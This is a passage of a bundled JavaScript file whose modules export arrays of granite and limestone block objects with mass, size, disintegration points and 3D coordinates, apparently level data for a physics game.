45688693},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:349.7805107286078,y:6.449143878501916,z:-313.2120357717088},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:401.9643842062193,y:7.125527920493189,z:-296.3554152784524},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:429.65143316980186,y:5.496890385387463,z:-283.22039072893074},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:335.2537615983342,y:7.788911352759239,z:-343.8809741635879},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:368.88060364258706,y:10.706918469738278,z:-334.0821815404839},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:399.3542500925978,y:6.494338474557846,z:-315.90945271005717},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:353.49607395893855,y:13.987540384252755,z:-332.90133313378954},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:372.3757453463874,y:16.180610093697577,z:-326.49528267015444},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:382.85286305779607,y:13.973046994980212,z:-321.4509853336641},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:318.21953753850624,y:1.798454023259897,z:-304.7010480375613},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:321.7469850562879,y:7.991415123393504,z:-357.3622615595329},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:356.8198922667027,y:13.664961091305342,z:-306.40592668682143},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:365.5094795252794,y:15.820115539752837,z:-319.24782430259813},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:358.60869403077845,y:6.228535034416686,z:-273.2628641291879},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:347.9499342680039,y:13.249804807651058,z:-275.06594110458565},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:376.4991447626483,y:11.931044073284163,z:-291.38748140428663},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:394.848505586794,y:9.643763661145618,z:-307.62634952658755},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:357.444305436094,y:6.363744125764425,z:-262.71453616678855},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:356.70456285936353,y:13.81561711318634,z:-279.41795843317084},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:368.80161397877754,y:5.9952983028144535,z:-293.7054278183714},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:366.41277910863647,y:6.380944037025952,z:-257.7436121297945},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:389.71952083052867,y:7.171849284820296,z:-248.17226824753354},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:388.53797325806005,y:13.621059347252059,z:-300.5172854852946},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:399.2164291205525,y:5.499084908347748,z:-245.70693784666662},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:397.5485230702859,y:5.473683369003888,z:-256.30025102050087},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:387.66220554296433,y:6.399362086886303,z:-257.8718865588173},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:358.8790878530787,y:11.959201930493762,z:-254.41612103462768},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:359.1038411177064,y:21.215442032210632,z:-285.65994152648074},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:405.86793074361634,y:6.379769742141937,z:-305.46695154327665},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:410.13853332244946,y:7.043240299812633,z:-218.7445331214656},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:406.15019703813795,y:7.490529158036738,z:-238.86340639103133},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:411.2575041016261,y:5.468043556232575,z:-293.0751563616476},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:380.9783466226436,y:18.75761288415209,z:-296.67982570004875},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:378.0754195440106,y:6.315468617309033,z:-255.09148460484505},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:477.25564596703214,y:5.200594414642573,z:-269.99854755809474},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:435.2270996784265,y:5.4799229562603236,z:-263.88012661060907},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:407.6068648373163,y:10.660614285385805,z:-318.6919761077493},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:336.81419229657206,y:9.08686910535857,z:-277.0604083210567},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:364.84772333957676,y:14.809824164766994,z:-298.3097023597209},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:364.7595866658399,y:13.511496970992035,z:-288.5041374839059},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:358.5735369246861,y:18.793341626505786,z:-325.77129089827747},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:392.23150702002505,y:12.744710057868506,z:-318.3170327674511},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:446.56942376065587,y:5.293301784086268,z:-276.52646959327075}];
},{}],188:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:393.27299055936135,y:6.32839643260025,z:-270.80268914968156},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:601.1778641064576,y:5.441301896424717,z:-323.31837459176796},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:394.4396608343642,y:5.463602500871975,z:-259.957858782984},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:401.07772020079926,y:10.916804950842245,z:-184.04391274032648},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:383.5912766269629,y:6.214276012244172,z:-258.79514631494374},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:460.69914119723893,y:5.478893641214285,z:-223.84557811273456},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:399.84669580486946,y:5.440708395087805,z:-251.41392573668045},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:387.6753381587101,y:6.38887226587357,z:-279.08712509416785},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:375.7214147605545,y:6.395206477426929,z:-275.00104407475953},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:389.14096050142706,y:5.479953249438699,z:-250.27745309542212},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:357.90190335463166,y:6.306419224706472,z:-267.5658661583201},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:477.90627663781703,y:5.4852005731599425,z:-239.9424180289514},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:379.22019886001885,y:6.394910895311938,z:-284.40972915638},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:388.6783834921456,y:9.745990545963544,z:-288.4024386083544},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:429.60058488379093,y:5.09315129726106,z:-252.0790917578018},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:383.53057930200237,y:6.427083531467047,z:-268.76374663196066},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:353.0557620484243,y:9.335052484702242,z:-259.46930215036883},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:401.7083658655158,y:6.489555679839657,z:-314.25108042074686},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:352.39293018476815,y:6.2870815813496215,z:-293.0897004238541},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:315.3647942888997,y:-8.857340245998499,z:-289.7757900451436},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:507.2441354255311,y:10.492664537502403,z:-241.6188428287167},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:378.2526611311477,y:11.117005946002422,z:-299.04628023623724},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:362.23696376792003,y:11.279437897182063,z:-283.0899733662955},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:369.58031544927366,y:11.484664829875213,z:-259.70953032345665},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:426.7611681445628,y:10.490940831014836,z:-220.55443992442827},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:332.2140862011361,y:11.484260866618413,z:-275.3002356036762},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:319.5599157067558,y:9.458494049847793,z:-301.4058338734156},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:345.43364531594773,y:11.24104754698257,z:-306.4991699488158},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:335.5402517682286,y:10.4725943657161,z:-336.52288618074067},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:349.66785350899113,y:19.39786410547311,z:-269.819394529148},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:333.85242252172134,y:20.567231082863906,z:-293.01221021997424},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:183.48075051669414,y:13.336490417493218,z:-413.0206042119309},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:357.8101200677104,y:31.071455198292668,z:-297.70201734264305},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:366.91700847169994,y:16.43051177247287,z:-322.2467594293656}];
},{}],189:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:354.42009276923557,y:16.388682528416382,z:-293.4317426002526},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:383.5240507793869,y:16.481239451150817,z:-281.84228358655014},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:367.5236949794247,y:16.282317949592994,z:-325.06138633884404},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:415.74671697086865,y:15.49791883386766,z:-299.8518189470777},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:361.22238046184094,y:17.723009420080142,z:-261.8991696681798},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:330.3098086409038,y:16.487633540130467,z:-275.19684181569386},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:395.2262161539338,y:16.298347189236306,z:-250.78307335914155},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:348.37285027809213,y:40.39727236256576,z:-276.5362192370348},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:389.94224281406184,y:27.856488301032268,z:-308.84607680340025},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:381.10577796520784,y:32.73104085476598,z:-263.1796016812493},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:267.83521066258396,y:13.324597449549213,z:-308.51968601441087},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:318.1239453459283,y:8.566868892424694,z:-295.495179931444},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:332.8843357765238,y:10.484918258880299,z:-339.95267137858553},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:339.13979329205335,y:11.595599749595245,z:-321.0074371587509},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:375.88318679298527,y:40.25911202287519,z:-282.3510546822188},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:332.7221842795195,y:11.136921511709206,z:-294.2373421672381},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:352.0243154316994,y:6.435397585689485,z:-315.3747462423711},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:357.98543032460265,y:7.884700362593304,z:-352.30669710468504},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:349.73257467957876,y:6.307062476747221,z:-329.9271269352617},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:380.0653270194924,y:6.46781502091253,z:-305.3083544683152},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:353.05693637223146,y:21.577278794818195,z:-312.31313140496815},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:349.02228076356596,y:22.79803919652544,z:-321.3496201300228},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:333.333384279224,y:7.252555053343494,z:-359.8400972820472},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:366.0033769045657,y:24.99449280180943,z:-279.81829026081897},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:538.8888278720841,y:5.29569054295254,z:-286.02198123668165},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:358.75668036399355,y:29.524580299891223,z:-312.9864804470617},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:463.91116818061914,y:5.491356722085731,z:-217.75078051045202},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:375.0365808958485,y:10.713869295023823,z:-342.66731129269596},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:384.3481607034879,y:10.607049463207883,z:-339.2260737634165},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:369.1210377674705,y:21.749465671968153,z:-305.890327679236},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:434.2691182537559,y:5.362454232503752,z:-228.65310065556125},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:395.7083466330414,y:21.51749006465261,z:-346.05475855536514},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:386.7696531959441,y:17.134154852664352,z:-345.7640809082557}];
},{}],190:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-211.44235761127698,y:10.46789017319294,z:-1043.0446208964875},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-185.88941113814448,y:15.487204226247611,z:-1031.03314650462},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-215.97067774639856,y:18.465080607138738,z:-1068.4191836750035},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-160.75050845244766,y:21.309335006513923,z:-1060.5120420606381},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-184.5781100333229,y:10.465480060430997,z:-1063.6975509848262},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-222.59081962294195,y:5.443071725120139,z:-1065.2306187010213},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-226.1225525634883,y:4.486432429887817,z:-1076.0247478095712},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-216.72077203626543,y:5.362941814714413,z:-1079.2881566030867},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-229.18337239621818,y:11.49382258937249,z:-1069.6595329280137},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-225.6742216973775,y:4.240131674256775,z:-1086.2684194453552},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-218.92296779475032,y:11.869163429014566,z:-1086.4422136193407},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-169.38402880892826,y:5.156418437480299,z:-1053.5432702026155},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-168.62246582712368,y:8.816170460278155,z:-1062.5187116535599},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-182.27050481018358,y:5.040385739309844,z:-1047.735761237404},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-164.12171653156003,y:5.420824688922714,z:-1041.910073946198},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-288.74160429140966,y:4.290094390277681,z:-1064.7766395007025},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-239.6009789633041,y:4.36000528507822,z:-1052.5103805784606},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-232.59185118348063,y:5.4819611551001115,z:-1035.2451734823596},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-258.55132568705056,y:4.4925202419089345,z:-1037.7574122326687},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-245.18358467295363,y:4.474091189548167,z:-1043.5260385009342},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-256.8338285684623,y:4.304467492372787,z:-1051.0926292906063},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-215.40513151055842,y:11.53358088322153,z:-1028.6204945935717},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-208.21790723053036,y:5.2808919082946435,z:-1062.2880028774402},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-236.63920140641125,y:-56.78384209316564,z:-939.8347549729516},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-235.40425165135912,y:8.34673636708976,z:-1044.3883503154248},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-210.44275874351084,y:17.77622104099961,z:-1022.5171729763692},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-254.63790234441652,y:11.486713907155663,z:-1031.8120246780304},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-194.95680426836805,y:5.398444093072021,z:-1073.8322086455382},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-198.0554354322784,y:5.268741886033242,z:-1059.8562459320488},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-208.91621843632052,y:5.2863846928394045,z:-1072.2435073916931},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-202.8593229393802,y:7.324155389868238,z:-1079.6457845116895},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-227.99442983147117,y:13.72228860077388,z:-1090.030230261327},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-210.21897087078509,y:13.414002306139139,z:-1081.793819767479},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-189.76795193732374,y:13.791400113846617,z:-1077.183650644346},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-171.71248199956918,y:12.54173399519994,z:-1070.8119883091701},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-123.91719551059133,y:4.346435541090167,z:-1029.6804452646331},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-198.50726972140208,y:5.391463548212533,z:-1048.569021200504},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-173.263449874586,y:7.915874556706455,z:-1044.6427123696444},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-161.92585057345931,y:11.113407723664524,z:-1049.8428008365024},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-221.1405634492032,y:20.9721022984644,z:-1089.4736258062221},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-198.70264154071214,y:15.773257911001053,z:-1080.574309777047},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-178.5331559071438,y:18.781650291240812,z:-1074.5178577401346},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-210.57117512258242,y:22.164871835813564,z:-1086.4380335949513},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-202.7976401788794,y:22.114999190280667,z:-1074.2032735617322},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-194.53228802948863,y:20.266814334950563,z:-1069.025971596649},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-218.5994332031406,y:5.495614674150902,z:-1055.4733251231378},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-231.8851434110937,y:10.434200020493229,z:-1081.48566774512},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-202.49145510614048,y:18.212174820305645,z:-1062.308816181895},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-201.56082313572617,y:10.674142099958289,z:-1068.7248788077532},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-205.57625348582872,y:12.500657164470274,z:-1029.6529807410243},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-200.1305491892778,y:13.63759732886136,z:-1053.872157996102},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-195.05766991316395,y:22.236543626172917,z:-1047.4238662209573},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-178.61468139328974,y:14.16415004840548,z:-1050.2282905060242},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-208.6922358738228,y:5.4002320701781725,z:-1024.04521139624},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-204.71711526509372,y:20.947444389331604,z:-1034.71071017234},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-190.14043890468656,y:10.709337017135171,z:-1049.8777814681598},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-199.39969331847476,y:5.151799993991084,z:-1020.7352157393381},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-172.6927898369239,y:7.679381996554739,z:-1007.8013985371819},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-166.41365355126848,y:11.727845867592814,z:-1031.5682444463298},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-150.06630025519914,y:4.37553051858798,z:-1001.2076566718647},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-155.86248205123002,y:4.220067275109707,z:-1018.3049099248217},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-159.91923767355328,y:4.460629611171104,z:-1030.4080806825916},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-189.0356873435955,y:8.671407658890173,z:-1012.5518629572812},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-198.0281722680072,y:12.932616253396334,z:-1011.6179809205616},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-158.992555679159,y:16.464879326036925,z:-1042.0379677264484},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-161.03231930541907,y:7.632553366925205,z:-1003.6872609819884},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-165.14170716542583,y:5.278996693061025,z:-1022.2277856902018},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-154.8635646390812,y:12.322877062987835,z:-1033.9638396522296},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-153.99061129501393,y:12.83469144139295,z:-1022.5428202661157},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-174.50449732447657,y:5.187577747349884,z:-1018.766784295111},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-163.88222278267713,y:4.426236705132928,z:-1012.3704333894349},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-168.56341564626214,y:12.421231485663254,z:-1015.7688615432486},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-174.71141298215773,y:22.115990414964024,z:-1065.8887027675628},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-247.2411510364744,y:4.36926154638014,z:-985.9546929627654},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-206.67366367270245,y:11.107363002887794,z:-1016.2090472687446},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-204.84117019933853,y:23.000491461081403,z:-1047.3218433543434},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-193.49673975701472,y:20.375700701336203,z:-1056.9174359266935},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-168.87318540175033,y:16.28041268003623,z:-1041.428339154191},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-101.22640595176652,y:4.423013002727968,z:-1013.1104015833383}];
},{}],191:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-28.225753319606206,y:4.424185261386977,z:-921.6498678538222},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-158.6852912684566,y:4.247996761903813,z:-1024.9022508405692},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-152.96758259444186,y:6.380597098267033,z:-1010.5179101764442},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-162.12065944518565,y:4.473022017975295,z:-1007.1941123721928},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-192.36115368726502,y:-126.69548023800733,z:-921.2016384963495},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-162.69530282008523,y:7.4640082781969985,z:-1040.4704299204773},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-152.6436176144458,y:10.233673855441603,z:-1019.6578354616498},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-164.8005021305926,y:9.42188880573271,z:-1030.9328611152405},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-172.82314717789052,y:5.467041067094497,z:-1026.4688613602268},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-180.63872878892568,y:5.323787788040939,z:-1012.6470104547539},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-242.46389509103773,y:4.49279471492283,z:-987.2382872585544},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-173.30648187820768,y:9.97416955765689,z:-1017.6080373099353},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-171.722339105797,y:6.931588759844636,z:-1008.2619309182313},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-68.04282849239122,y:4.437731665577472,z:-1025.8743957746462},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-150.53689116701997,y:4.031777347722125,z:-999.2817019872559},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-164.3780745266981,y:4.488635860404087,z:-1016.8606815217746},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-181.37073422670062,y:-65.7330241219267,z:-932.3921111966096},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-165.51246019025427,y:12.3224715664659,z:-1048.305524777735},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-209.91120913943578,y:5.377242217685555,z:-1080.0571621712684},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-209.90826395758492,y:5.121509456266848,z:-1068.8802701230002},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-168.492891772707,y:15.747836908518028,z:-1062.2680287827645},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-177.58558894288512,y:10.182824162256868,z:-1039.8910584211435},{material:"granite",dimension